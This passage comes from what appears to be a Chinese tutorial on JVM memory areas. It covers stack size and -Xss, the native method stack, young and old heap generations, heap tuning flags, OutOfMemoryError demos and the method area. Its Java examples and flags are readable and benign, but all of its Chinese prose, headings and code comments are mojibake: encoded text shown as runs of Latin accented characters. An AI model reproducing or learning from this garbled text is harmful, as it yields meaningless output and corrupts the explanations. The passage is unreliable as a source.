<p><strong>äº§ç”ŸåŸå› ï¼š</strong></p>
<ul>
<li>åˆ›å»ºçº¿ç¨‹è¿‡å¤šï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½éœ€è¦æ ˆç©ºé—´</li>
<li>æ ˆè®¾ç½®è¿‡å¤§ï¼Œå¯¼è‡´æ€»å†…å­˜ä¸è¶³</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StackOOM</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
                <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
                    <span class="hljs-comment">// çº¿ç¨‹ä¸é€€å‡ºï¼Œæ ˆç©ºé—´ä¸é‡Šæ”¾</span>
                }
            }).start();  <span class="hljs-comment">// åˆ›å»ºè¿‡å¤šçº¿ç¨‹ï¼Œå¯¼è‡´OOM</span>
        }
    }
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>å‡å°‘çº¿ç¨‹æ•°</li>
<li>å‡å°æ ˆå¤§å°</li>
<li>ä¼˜åŒ–çº¿ç¨‹ä½¿ç”¨æ–¹å¼</li>
</ul>
<h4 data-id="heading-30">4.5 æ ˆå¤§å°è®¾ç½®</h4>
<p><strong>-Xsså‚æ•°ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">-Xss1m  <span class="hljs-comment">// è®¾ç½®æ ˆå¤§å°ä¸º1MB</span>
-Xss2m  <span class="hljs-comment">// è®¾ç½®æ ˆå¤§å°ä¸º2MB</span>
</code></pre>
<p><strong>é»˜è®¤å€¼ï¼š</strong></p>
<ul>
<li>ä¸åŒå¹³å°å’ŒJVMç‰ˆæœ¬ä¸åŒ</li>
<li>é€šå¸¸ä¸º1MBå·¦å³ï¼ˆLinux/x86ï¼š1024KBï¼ŒWindowsï¼šé»˜è®¤ä¾èµ–äºè™šæ‹Ÿå†…å­˜ï¼‰</li>
</ul>
<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li>æ ˆå¤§å°è®¾ç½®è¿‡å°ï¼šå¯èƒ½å¯¼è‡´StackOverflowError</li>
<li>æ ˆå¤§å°è®¾ç½®è¿‡å¤§ï¼šå¯èƒ½æµªè´¹å†…å­˜ï¼Œæˆ–å¯¼è‡´å¯åˆ›å»ºçš„çº¿ç¨‹æ•°å‡å°‘</li>
</ul>
<h4 data-id="heading-31">4.6 ä¸JMMå·¥ä½œå†…å­˜çš„å…³ç³»</h4>
<p><strong>å¯¹åº”å…³ç³»ï¼š</strong></p>
<ul>
<li>JMMä¸­çš„"å·¥ä½œå†…å­˜"ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„"è™šæ‹Ÿæœºæ ˆå±€éƒ¨å˜é‡è¡¨"</li>
<li>å±€éƒ¨å˜é‡è¡¨ä¸­å­˜å‚¨çš„å˜é‡å‰¯æœ¬å°±æ˜¯JMMå·¥ä½œå†…å­˜çš„å†…å®¹</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JMMRelation</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">shared</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// ä¸»å†…å­˜ï¼ˆå †ï¼‰</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">local</span> <span class="hljs-operator">=</span> shared;  <span class="hljs-comment">// ä»ä¸»å†…å­˜è¯»å–åˆ°å·¥ä½œå†…å­˜ï¼ˆå±€éƒ¨å˜é‡è¡¨ï¼‰</span>
        local = local + <span class="hljs-number">1</span>;   <span class="hljs-comment">// åœ¨å·¥ä½œå†…å­˜ä¸­è®¡ç®—</span>
        shared = local;      <span class="hljs-comment">// å†™å›ä¸»å†…å­˜ï¼ˆå †ï¼‰</span>
    }
}
</code></pre>
<h3 data-id="heading-32">5. æœ¬åœ°æ–¹æ³•æ ˆï¼ˆNative Method Stackï¼‰</h3>
<h4 data-id="heading-33">5.1 ä½œç”¨</h4>
<p>æœ¬åœ°æ–¹æ³•æ ˆä¸è™šæ‹Ÿæœºæ ˆçš„ä½œç”¨éå¸¸ç›¸ä¼¼ï¼ŒåŒºåˆ«åœ¨äºï¼š</p>
<ul>
<li>è™šæ‹Ÿæœºæ ˆä¸ºJavaæ–¹æ³•æœåŠ¡</li>
<li>æœ¬åœ°æ–¹æ³•æ ˆä¸ºNativeæ–¹æ³•ï¼ˆæœ¬åœ°æ–¹æ³•ï¼‰æœåŠ¡</li>
</ul>
<p><strong>Nativeæ–¹æ³•ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨nativeå…³é”®å­—å£°æ˜çš„æ–¹æ³•</li>
<li>é€šå¸¸ç”¨C/C++ç­‰è¯­è¨€å®ç°</li>
<li>é€šè¿‡JNIï¼ˆJava Native Interfaceï¼‰è°ƒç”¨</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NativeExample</span> {
    <span class="hljs-comment">// Nativeæ–¹æ³•å£°æ˜</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">nativeMethod</span><span class="hljs-params">()</span>;
    
    <span class="hljs-keyword">static</span> {
        <span class="hljs-comment">// åŠ è½½æœ¬åœ°åº“</span>
        System.loadLibrary(<span class="hljs-string">"nativeLib"</span>);
    }
}
</code></pre>
<h4 data-id="heading-34">5.2 ä¸è™šæ‹Ÿæœºæ ˆçš„åŒºåˆ«</h4>






























<table><thead><tr><th>ç‰¹æ€§</th><th>è™šæ‹Ÿæœºæ ˆ</th><th>æœ¬åœ°æ–¹æ³•æ ˆ</th></tr></thead><tbody><tr><td><strong>æœåŠ¡å¯¹è±¡</strong></td><td>Javaæ–¹æ³•</td><td>Nativeæ–¹æ³•</td></tr><tr><td><strong>å­˜å‚¨å†…å®¹</strong></td><td>Javaæ–¹æ³•çš„å±€éƒ¨å˜é‡ã€å‚æ•°ç­‰</td><td>Nativeæ–¹æ³•çš„å±€éƒ¨å˜é‡ã€å‚æ•°ç­‰</td></tr><tr><td><strong>è¯­è¨€</strong></td><td>Javaå­—èŠ‚ç </td><td>C/C++ç­‰æœ¬åœ°ä»£ç </td></tr><tr><td><strong>å®ç°</strong></td><td>JVMå®ç°</td><td>å¯èƒ½ç”±JVMæˆ–æ“ä½œç³»ç»Ÿå®ç°</td></tr></tbody></table>
<p><strong>æ³¨æ„ï¼š</strong> æœ‰äº›JVMå®ç°ï¼ˆå¦‚HotSpotï¼‰å°†è™šæ‹Ÿæœºæ ˆå’Œæœ¬åœ°æ–¹æ³•æ ˆåˆäºŒä¸ºä¸€ã€‚</p>
<h4 data-id="heading-35">5.3 å¼‚å¸¸æƒ…å†µ</h4>
<p>æœ¬åœ°æ–¹æ³•æ ˆä¹Ÿä¼šå‘ç”ŸStackOverflowErrorå’ŒOutOfMemoryErrorï¼ŒåŸå› å’Œè™šæ‹Ÿæœºæ ˆç±»ä¼¼ã€‚</p>
<h3 data-id="heading-36">6. Javaå †ï¼ˆJava Heapï¼‰- é‡ç‚¹</h3>
<h4 data-id="heading-37">6.1 å †çš„ç»“æ„å›¾ï¼ˆè¯¦ç»†ï¼‰</h4>
<pre><code class="hljs language-scss" lang="scss">Javaå †ç»“æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    æ–°ç”Ÿä»£(<span class="hljs-number">1</span>/<span class="hljs-number">3</span>)   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚  <span class="hljs-built_in">Eden</span>(<span class="hljs-number">80%</span>)â”‚  â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â”‚
â”‚  â”‚ <span class="hljs-built_in">S0</span>(<span class="hljs-number">10%</span>)S1 â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   è€å¹´ä»£(<span class="hljs-number">2</span>/<span class="hljs-number">3</span>)    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-38">6.2 å †çš„ä½œç”¨</h4>
<p><strong>ä¸»è¦ä½œç”¨ï¼š</strong></p>
<ol>
<li><strong>å­˜å‚¨å¯¹è±¡å®ä¾‹</strong>ï¼šæ‰€æœ‰é€šè¿‡newåˆ›å»ºçš„å¯¹è±¡éƒ½å­˜å‚¨åœ¨å †ä¸­</li>
<li><strong>å­˜å‚¨æ•°ç»„</strong>ï¼šæ•°ç»„å¯¹è±¡ä¹Ÿå­˜å‚¨åœ¨å †ä¸­</li>
<li><strong>çº¿ç¨‹å…±äº«</strong>ï¼šæ‰€æœ‰çº¿ç¨‹å…±äº«å †å†…å­˜ï¼Œçº¿ç¨‹é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</li>
</ol>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeapExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createObjects</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å¯¹è±¡å­˜å‚¨åœ¨å †ä¸­</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¯¹è±¡åœ¨å †ä¸­ï¼Œobj1å¼•ç”¨åœ¨æ ˆä¸­</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¯¹è±¡åœ¨å †ä¸­ï¼Œobj2å¼•ç”¨åœ¨æ ˆä¸­</span>
        
        <span class="hljs-comment">// æ•°ç»„ä¹Ÿå­˜å‚¨åœ¨å †ä¸­</span>
        <span class="hljs-type">int</span>[] array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];   <span class="hljs-comment">// æ•°ç»„å¯¹è±¡åœ¨å †ä¸­ï¼Œarrayå¼•ç”¨åœ¨æ ˆä¸­</span>
        
        <span class="hljs-comment">// å­—ç¬¦ä¸²å¯¹è±¡ä¹Ÿåœ¨å †ä¸­ï¼ˆå­—ç¬¦ä¸²å¸¸é‡æ± ä¹Ÿåœ¨å †ä¸­ï¼ŒJDK 8ä¹‹åï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Hello"</span>);  <span class="hljs-comment">// å­—ç¬¦ä¸²å¯¹è±¡åœ¨å †ä¸­</span>
    }
}
</code></pre>
<h4 data-id="heading-39">6.3 æ–°ç”Ÿä»£è¯¦è§£</h4>
<p><strong>æ–°ç”Ÿä»£ï¼ˆYoung Generationï¼‰çš„ä½œç”¨ï¼š</strong></p>
<p>æ–°ç”Ÿä»£æ˜¯å †çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå­˜æ”¾æ–°åˆ›å»ºçš„å¯¹è±¡ã€‚å¤§éƒ¨åˆ†å¯¹è±¡åœ¨æ–°ç”Ÿä»£ä¸­åˆ›å»ºï¼Œå¹¶ä¸”å¾ˆå¿«å°±ä¼šè¢«å›æ”¶ã€‚</p>
<p><strong>æ–°ç”Ÿä»£çš„ç»“æ„ï¼š</strong></p>
<ol>
<li>
<p><strong>EdenåŒºï¼ˆä¼Šç”¸å›­ï¼‰</strong></p>
<ul>
<li>æ–°å¯¹è±¡é¦–å…ˆåˆ†é…åœ¨EdenåŒº</li>
<li>çº¦å æ–°ç”Ÿä»£çš„80%</li>
<li>å¤§éƒ¨åˆ†å¯¹è±¡ç”Ÿå‘½å‘¨æœŸå¾ˆçŸ­ï¼Œåœ¨EdenåŒºå°±è¢«å›æ”¶</li>
</ul>
</li>
<li>
<p><strong>SurvivoråŒºï¼ˆå­˜æ´»åŒºï¼‰</strong></p>
<ul>
<li>åˆ†ä¸ºFrom Survivorå’ŒTo Survivorä¸¤ä¸ªåŒºåŸŸ</li>
<li>æ¯ä¸ªçº¦å æ–°ç”Ÿä»£çš„10%</li>
<li>ç”¨äºå­˜æ”¾Minor GCåå­˜æ´»çš„å¯¹è±¡</li>
</ul>
</li>
</ol>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦SurvivoråŒºï¼Ÿ</strong></p>
<p>å¦‚æœæ²¡æœ‰SurvivoråŒºï¼ŒMinor GCåå­˜æ´»çš„å¯¹è±¡ä¼šç›´æ¥è¿›å…¥è€å¹´ä»£ï¼Œå¯¼è‡´ï¼š</p>
<ul>
<li>è€å¹´ä»£å¾ˆå¿«è¢«å¡«æ»¡</li>
<li>é¢‘ç¹è§¦å‘Full GC</li>
<li>å½±å“æ€§èƒ½</li>
</ul>
<p>æœ‰äº†SurvivoråŒºï¼Œå¯ä»¥ï¼š</p>
<ul>
<li>è®©å¯¹è±¡åœ¨æ–°ç”Ÿä»£å¤šå­˜æ´»å‡ æ¬¡</li>
<li>åªæœ‰çœŸæ­£é•¿æœŸå­˜æ´»çš„å¯¹è±¡æ‰è¿›å…¥è€å¹´ä»£</li>
<li>å‡å°‘Full GCçš„é¢‘ç‡</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦ä¸¤ä¸ªSurvivoråŒºï¼Ÿ</strong></p>
<p>ä½¿ç”¨ä¸¤ä¸ªSurvivoråŒºå¯ä»¥å®ç°å¤åˆ¶ç®—æ³•ï¼š</p>
<ul>
<li>Minor GCæ—¶ï¼Œå°†EdenåŒºå’ŒFrom Survivorä¸­çš„å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°To Survivor</li>
<li>æ¸…ç©ºEdenåŒºå’ŒFrom Survivor</li>
<li>From Survivorå’ŒTo Survivorè§’è‰²äº’æ¢</li>
</ul>
<p>è¿™æ ·å¯ä»¥ï¼š</p>
<ul>
<li>ä¿è¯æ–°ç”Ÿä»£å§‹ç»ˆæœ‰ä¸€ä¸ªSurvivoråŒºæ˜¯ç©ºçš„</li>
<li>å®ç°é«˜æ•ˆçš„å¤åˆ¶ç®—æ³•</li>
<li>é¿å…å†…å­˜ç¢ç‰‡</li>
</ul>
<p><strong>å¯¹è±¡åœ¨æ–°ç”Ÿä»£ä¸­çš„æµè½¬ï¼š</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-number">1</span>. å¯¹è±¡åˆ›å»º â†’ EdenåŒº
   <span class="hljs-built_in">new</span> <span class="hljs-type">Object</span>() â†’ EdenåŒº

<span class="hljs-number">2</span>. EdenåŒºæ»¡ â†’ è§¦å‘Minor GC
   EdenåŒºæ»¡ â†’ Minor GCå¼€å§‹

<span class="hljs-number">3</span>. å­˜æ´»å¯¹è±¡ â†’ SurvivoråŒº
   EdenåŒºå­˜æ´»å¯¹è±¡ â†’ å¤åˆ¶åˆ°SurvivoråŒºï¼ˆ<span class="hljs-keyword">To</span>ï¼‰
   æ¸…ç©ºEdenåŒº

<span class="hljs-number">4</span>. å¯¹è±¡åœ¨SurvivoråŒºä¹‹é—´å¤åˆ¶
   Minor GC â†’ <span class="hljs-keyword">From</span> Survivorå­˜æ´»å¯¹è±¡ â†’ å¤åˆ¶åˆ°<span class="hljs-keyword">To</span> Survivor
   å¯¹è±¡å¹´é¾„+<span class="hljs-number">1</span>
   <span class="hljs-keyword">From</span>å’Œ<span class="hljs-keyword">To</span>è§’è‰²äº’æ¢

<span class="hljs-number">5</span>. å¹´é¾„è¾¾åˆ°é˜ˆå€¼ â†’ æ™‹å‡è€å¹´ä»£
   å¯¹è±¡å¹´é¾„è¾¾åˆ°<span class="hljs-number">15</span>ï¼ˆé»˜è®¤ï¼‰â†’ æ™‹å‡åˆ°è€å¹´ä»£
</code></pre>
<p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">YoungGeneration</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createObjects</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ–°å¯¹è±¡åœ¨EdenåŒº</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¤§éƒ¨åˆ†å¯¹è±¡å¾ˆå¿«è¢«å›æ”¶</span>
        }
        
        <span class="hljs-comment">// é•¿æœŸå­˜æ´»çš„å¯¹è±¡ä¼šç»å†å¤šæ¬¡GCåè¿›å…¥è€å¹´ä»£</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">longLived</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¦‚æœå¤šæ¬¡GCåä»å­˜æ´»ï¼Œä¼šè¿›å…¥è€å¹´ä»£</span>
    }
}
</code></pre>
<h4 data-id="heading-40">6.4 è€å¹´ä»£è¯¦è§£</h4>
<p><strong>è€å¹´ä»£ï¼ˆOld Generationï¼‰çš„ä½œç”¨ï¼š</strong></p>
<p>è€å¹´ä»£ç”¨äºå­˜æ”¾é•¿æœŸå­˜æ´»çš„å¯¹è±¡ã€‚ç»è¿‡å¤šæ¬¡Minor GCä»ç„¶å­˜æ´»çš„å¯¹è±¡ä¼šæ™‹å‡åˆ°è€å¹´ä»£ã€‚</p>
<p><strong>è€å¹´ä»£çš„ç‰¹ç‚¹ï¼š</strong></p>
<ol>
<li><strong>å¯¹è±¡ç”Ÿå‘½å‘¨æœŸé•¿</strong>ï¼šå­˜å‚¨çš„å¯¹è±¡é€šå¸¸ç”Ÿå‘½å‘¨æœŸè¾ƒé•¿</li>
<li><strong>GCé¢‘ç‡ä½</strong>ï¼šè€å¹´ä»£çš„GCï¼ˆFull GCï¼‰é¢‘ç‡è¾ƒä½</li>
<li><strong>GCè€—æ—¶é•¿</strong>ï¼šFull GCé€šå¸¸æ¯”Minor GCè€—æ—¶æ›´é•¿</li>
<li><strong>å ç”¨ç©ºé—´å¤§</strong>ï¼šé€šå¸¸å å †å†…å­˜çš„2/3</li>
</ol>
<p><strong>å¯¹è±¡è¿›å…¥è€å¹´ä»£çš„æ¡ä»¶ï¼š</strong></p>
<ol>
<li><strong>å¹´é¾„è¾¾åˆ°é˜ˆå€¼</strong>ï¼šå¯¹è±¡åœ¨SurvivoråŒºä¸­ç»å†GCçš„æ¬¡æ•°è¾¾åˆ°é˜ˆå€¼ï¼ˆé»˜è®¤15æ¬¡ï¼‰</li>
<li><strong>å¤§å¯¹è±¡</strong>ï¼šè¶…è¿‡-XX:PretenureSizeThresholdè®¾ç½®çš„å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£</li>
<li><strong>åŠ¨æ€å¹´é¾„åˆ¤å®š</strong>ï¼šSurvivoråŒºä¸­ç›¸åŒå¹´é¾„çš„å¯¹è±¡å¤§å°è¶…è¿‡SurvivoråŒºçš„ä¸€åŠï¼Œå¤§äºç­‰äºè¯¥å¹´é¾„çš„å¯¹è±¡è¿›å…¥è€å¹´ä»£</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OldGeneration</span> {
    <span class="hljs-comment">// é•¿æœŸå­˜æ´»çš„å¯¹è±¡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Object&gt; longLivedObjects = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createLongLivedObjects</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è¿™äº›å¯¹è±¡ç»è¿‡å¤šæ¬¡GCåä»å­˜æ´»ï¼Œä¼šè¿›å…¥è€å¹´ä»£</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
            longLivedObjects.add(obj);  <span class="hljs-comment">// å¯¹è±¡è¢«å¼•ç”¨ï¼Œä¸ä¼šè¢«å›æ”¶</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-41">6.5 å †çš„å¤§å°è®¾ç½®ï¼ˆç®€è¦ï¼‰</h4>
<p><strong>å¸¸ç”¨å‚æ•°ï¼š</strong></p>
<ul>
<li>
<p><strong>-Xms</strong>ï¼šåˆå§‹å †å¤§å°</p>
<ul>
<li>ä¾‹å¦‚ï¼š-Xms256mï¼ˆåˆå§‹å †256MBï¼‰</li>
</ul>
</li>
<li>
<p><strong>-Xmx</strong>ï¼šæœ€å¤§å †å¤§å°</p>
<ul>
<li>ä¾‹å¦‚ï¼š-Xmx1024mï¼ˆæœ€å¤§å †1GBï¼‰</li>
</ul>
</li>
<li>
<p><strong>-Xmn</strong>ï¼šæ–°ç”Ÿä»£å¤§å°</p>
<ul>
<li>ä¾‹å¦‚ï¼š-Xmn256mï¼ˆæ–°ç”Ÿä»£256MBï¼‰</li>
</ul>
</li>
<li>
<p><strong>-XX:NewRatio</strong>ï¼šæ–°ç”Ÿä»£ä¸è€å¹´ä»£çš„æ¯”ä¾‹</p>
<ul>
<li>ä¾‹å¦‚ï¼š-XX:NewRatio=2ï¼ˆæ–°ç”Ÿä»£:è€å¹´ä»£=1:2ï¼‰</li>
</ul>
</li>
<li>
<p><strong>-XX:SurvivorRatio</strong>ï¼šEdenä¸Survivorçš„æ¯”ä¾‹</p>
<ul>
<li>ä¾‹å¦‚ï¼š-XX:SurvivorRatio=8ï¼ˆEden:Survivor=8:1ï¼‰</li>
</ul>
</li>
</ul>
<p><strong>è®¾ç½®ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">java -Xms512m -Xmx1024m -Xmn256m -XX:NewRatio=2 -XX:SurvivorRatio=8 MyApp
</code></pre>
<h4 data-id="heading-42">6.6 å †çš„å¼‚å¸¸</h4>
<p><strong>OutOfMemoryError: Java heap space</strong></p>
<p>å½“å †å†…å­˜ä¸è¶³ä»¥åˆ†é…æ–°å¯¹è±¡æ—¶ï¼Œä¼šæŠ›å‡ºOutOfMemoryError: Java heap spaceã€‚</p>
<p><strong>äº§ç”ŸåŸå› ï¼š</strong></p>
<ol>
<li>å †å†…å­˜è®¾ç½®å¤ªå°</li>
<li>åˆ›å»ºçš„å¯¹è±¡å¤ªå¤š</li>
<li>å†…å­˜æ³„æ¼ï¼šå¯¹è±¡è¢«å¼•ç”¨æ— æ³•å›æ”¶</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeapOOM</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        List&lt;Object&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>());  <span class="hljs-comment">// ä¸æ–­åˆ›å»ºå¯¹è±¡ï¼Œæœ€ç»ˆå †å†…å­˜æº¢å‡º</span>
        }
    }
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ol>
<li>å¢åŠ å †å¤§å°ï¼š-Xmxå‚æ•°</li>
<li>ä¼˜åŒ–ä»£ç ï¼šå‡å°‘å¯¹è±¡åˆ›å»º</li>
<li>æ’æŸ¥å†…å­˜æ³„æ¼ï¼šæ‰¾å‡ºæ— æ³•å›æ”¶çš„å¯¹è±¡</li>
</ol>
<h4 data-id="heading-43">6.7 ä¸JMMä¸»å†…å­˜çš„å…³ç³»</h4>
<p><strong>å¯¹åº”å…³ç³»ï¼š</strong></p>
<ul>
<li>JMMä¸­çš„"ä¸»å†…å­˜"ä¸»è¦å¯¹åº”JVMå†…å­˜åŒºåŸŸä¸­çš„"å †"</li>
<li>å…±äº«å˜é‡å­˜å‚¨åœ¨å †ä¸­</li>
<li>å †æ˜¯çº¿ç¨‹å…±äº«çš„ï¼Œå¯¹åº”ä¸»å†…å­˜çš„å…±äº«ç‰¹æ€§</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeapAndJMM</span> {
    <span class="hljs-comment">// å…±äº«å˜é‡å­˜å‚¨åœ¨å †ä¸­ï¼ˆä¸»å†…å­˜ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">shared</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// åœ¨å †ä¸­</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">thread1</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä»ä¸»å†…å­˜ï¼ˆå †ï¼‰è¯»å–</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">local</span> <span class="hljs-operator">=</span> shared;  <span class="hljs-comment">// ä»å †è¯»å–åˆ°æ ˆ</span>
        local++;             <span class="hljs-comment">// åœ¨æ ˆä¸­è®¡ç®—</span>
        shared = local;      <span class="hljs-comment">// å†™å›ä¸»å†…å­˜ï¼ˆå †ï¼‰</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">thread2</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä¹Ÿä»ä¸»å†…å­˜ï¼ˆå †ï¼‰è¯»å–</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">local</span> <span class="hljs-operator">=</span> shared;  <span class="hljs-comment">// ä»å †è¯»å–åˆ°æ ˆ</span>
        <span class="hljs-comment">// å¦‚æœthread1çš„ä¿®æ”¹è¿˜æ²¡å†™å›ï¼Œthread2å¯èƒ½çœ‹ä¸åˆ°æœ€æ–°çš„å€¼</span>
        <span class="hljs-comment">// è¿™å°±æ˜¯å¯è§æ€§é—®é¢˜</span>
    }
}
</code></pre>
<h3 data-id="heading-44">7. æ–¹æ³•åŒºï¼ˆMethod Areaï¼‰</h3>
<h4 data-id="heading-45">7.1 æ–¹æ³•åŒºç»“æ„å›¾</h4>
<pre><code class="hljs">æ–¹æ³•åŒºç»“æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   ç±»ä¿¡æ¯     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   å¸¸é‡æ±      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  é™æ€å˜é‡    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ JITç¼–è¯‘ä»£ç   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-46">7.2 ä½œç”¨</h4>
<p>æ–¹æ³•åŒºç”¨äºå­˜å‚¨ï¼š</p>
<ul>
<li><strong>ç±»ä¿¡æ¯</strong>ï¼šç±»çš„å…ƒæ•°æ®ã€æ–¹æ³•ä¿¡æ¯ã€å­—æ®µä¿¡æ¯ç­‰</li>
